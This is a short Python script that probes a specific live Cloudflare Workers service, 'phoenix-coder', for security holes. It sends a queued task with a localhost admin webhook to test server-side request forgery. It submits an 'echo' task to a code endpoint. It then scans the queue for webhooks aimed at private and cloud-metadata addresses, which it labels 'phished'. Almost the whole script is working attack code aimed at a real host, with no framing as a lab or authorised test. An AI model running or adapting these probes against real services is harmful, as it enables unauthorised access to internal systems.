import json, urllib.request
BASE = "https://phoenix-coder.mrmichaelhobbs123.workers.dev"
def call(ep, method="GET", body=None):
    url = f"{BASE}{ep}"
    data = json.dumps(body).encode() if body else None
    req = urllib.request.Request(url, data=data,
        headers={"Content-Type":"application/json","User-Agent":"curl/7.88.1"}, method=method)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, r.read()[:500].decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:500].decode()
    except Exception as e:
        return type(e).__name__, str(e)[:500]

# 01: SSRF queue direct
r = call("/api/queue", "POST", {"task":"ssrf-final","targetfile":"x.js","webhookUrl":"http://localhost:8080/admin"})
print("01 POST /api/queue localhost SSRF:", r)

# 02: /api/status
r = call("/api/status")
print("\n02 GET /api/status:", r if r[0]!=200 else json.loads(r[1]).get("version"))

# 03: CT guard on thin POST
print("\n03 CT guard: POST /api/code")
import time; t=time.time()
r = call("/api/code", "POST", {"task":"echo PHOENIX_V5_OK","targetfile":"_v5.js","maxTokens":32})
print(f"  ({time.time()-t:.1f}s) {r}")

# 04: Queue SSRF store scan > average count
# pulls CURRENT queue to count phished (from all prior probes in this session)
r = call("/api/queue")
if r[0]==200:
    tasks = json.loads(r[1]).get("tasks",[])
    priv = [t for t in tasks if any(p in (t.get("webhookUrl") or "") for p in ["localhost","127.0.0.1","169.254","10.","192.168.","[::1]"])]
    ext = [t for t in tasks if t.get("webhookUrl","").startswith("http") and not any(p in (t.get("webhookUrl") or "") for p in ["localhost","127.0.0.1","169.254","10.","192.168.","[::1]"])]
    print(f"\n04 Queue scan: total={len(tasks)} | phished-priv={len(priv)} | external={len(ext)}")
    for t in priv[:3]: print(f"   PRIV: {t.get('webhookUrl')}")
else:
    print("04 Queue fetch failed:", r)
